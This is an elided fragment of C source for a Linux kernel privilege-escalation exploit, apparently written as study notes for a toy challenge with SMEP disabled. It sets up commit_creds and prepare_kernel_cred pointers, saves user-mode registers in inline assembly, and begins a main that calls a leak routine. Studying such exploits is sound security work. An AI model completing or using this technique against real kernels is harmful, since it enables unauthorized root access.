/* see my notes here for more info:
 * https://www.notion.so/Process-and-task_struct-1348f5df87358075be32d9431aa31bd6*/
...
typedef int (*t_commit_creds)(
    void *); // t_commit_creds is a function pointer that takes a void* argument
             // and return value of type int.
typedef void *(*t_prepare_kernel_cred)(void *);

t_commit_creds commit_creds = (t_commit_creds)COMMIT_CREDS;
t_prepare_kernel_cred prepare_kernel_cred =
    (t_prepare_kernel_cred)PREPARE_KERNEL_CRED;
...
void save_state() {
    __asm__(".intel_syntax noprefix;"
            ...
            "mov _ss, ss;"
            "mov _rsp, rsp;"
            "pushf;" /* push all flags registers, which together only need an
                        unsigned long to represent */
            "pop _rflags;"
            ".att_syntax;");
...
int main() {
    ...
    leak();
    /* for this toy challenge, we disabled SMEP, so we can execute pages in user
     * space*/
    int offset = 0x100 / 8;
